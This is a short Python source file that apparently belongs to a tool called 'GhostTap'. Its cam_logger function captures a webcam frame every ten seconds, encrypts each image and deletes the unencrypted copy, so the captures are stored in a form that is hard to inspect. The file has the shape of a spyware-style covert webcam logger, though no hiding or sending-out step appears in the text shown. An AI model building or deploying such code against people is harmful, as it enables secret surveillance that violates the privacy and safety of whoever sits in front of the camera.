import cv2
import time
from datetime import datetime
import os
from encryptor import encrypt_file
import uuid

def cam_logger():
    cap = cv2.VideoCapture(0)
    time.sleep(1) # let camera warm up and adjust exposure to avoid black screen
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    LOG_DIR = os.path.join(BASE_DIR, "logs")
    os.makedirs(LOG_DIR, exist_ok=True)
    try:
        while cap.isOpened(): # while the cam is open
            ret, frame = cap.read()
            if ret: # if camera capture works
                unique_id = uuid.uuid4().hex # unique characters
                filename = os.path.join(LOG_DIR, f"{unique_id}.jpg")
                cv2.imwrite(filename, frame) # save image
                encrypted_filename = f"{filename}.enc" # add encrypted file
                encrypt_file(filename, encrypted_filename) # encrypt function
                os.remove(filename) # remove original .jpg
                time.sleep(10) # wait 10 seconds every save
    except KeyboardInterrupt: # ctrl + c interrupt
        print("GhostTap cam_logger stopped.")
    cap.release()